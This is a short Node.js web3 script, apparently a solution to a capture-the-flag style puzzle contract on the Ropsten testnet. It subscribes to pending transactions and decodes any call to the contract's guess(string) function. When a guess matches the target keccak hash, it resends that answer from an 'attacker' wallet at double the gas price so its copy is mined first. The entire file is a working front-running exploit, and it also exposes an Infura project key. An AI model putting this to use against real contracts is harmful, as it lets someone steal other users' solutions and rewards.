var fs = require('fs');
var Web3 = require("web3");

const url = "wss://ropsten.infura.io/ws/v3/9aa3d95b3bc440fa88ea12eaa4456161";
const target_addr = "0x8EfE0BFb7fc17101522B04117a419B9687e7604D";
const target_hash = "0xfed86ea1fff561ad70db0b9100188dbb26b4b0c0312c3927aa5bb7eecc37e73f";
const private_key = "";		// Redacted

const abijson = "./contract_abi.json";
const contract_abi = JSON.parse(fs.readFileSync(abijson));

var options = {
  timeout: 30000,
  clientConfig: {
    maxReceivedFrameSize: 100000000,
    maxReceivedMessageSize: 100000000,
  },
  reconnect: {
    auto: true,
    delay: 5000,
    maxAttempts: 15,
    onTimeout: false,
  },
};

var web3 = new Web3(new Web3.providers.WebsocketProvider(url, options));
const subscription = web3.eth.subscribe("pendingTransactions", (err, res) => {
  if (err) console.error(err);
});

const attacker = web3.eth.accounts.privateKeyToAccount(private_key);
web3.eth.accounts.wallet.add(attacker);

const target_func = web3.eth.abi.encodeFunctionSignature("guess(string)");
const contract_ins = new web3.eth.Contract(contract_abi, target_addr);

var frontrun = function () {
  subscription.on("data", (txHash) => {
    setTimeout(async () => {
      try {
        let tx = await web3.eth.getTransaction(txHash);
        if (tx !== null && tx.to !== null && tx.input !== null &&
            tx.from.toLowerCase() !== attacker.address.toLowerCase() &&
            tx.to.toLowerCase() === target_addr.toLowerCase() &&
            tx.input.substring(0, 10) === target_func) {

          var input_param = web3.eth.abi.decodeParameter('string', tx.input.substring(10));
          console.log("[+] Candidate:");
          console.log(tx);
          console.log("[+] Possible guess detected: " + input_param);
            
          if (web3.utils.keccak256(input_param).toLowerCase() === target_hash.toLowerCase()) {
            console.log("[+] Solution found! Front-running transaction...");
            const res = await contract_ins.methods.guess(input_param).send({"from": attacker.address, 
                                                                            "gasLimit": 500000, 
                                                                            "gasPrice": tx.gasPrice * 2});
          }

          else
            console.log("[-] Invalid solution");
            
        }
      } catch (err) {
        console.error(err);
      }
    });
  });
};

frontrun();
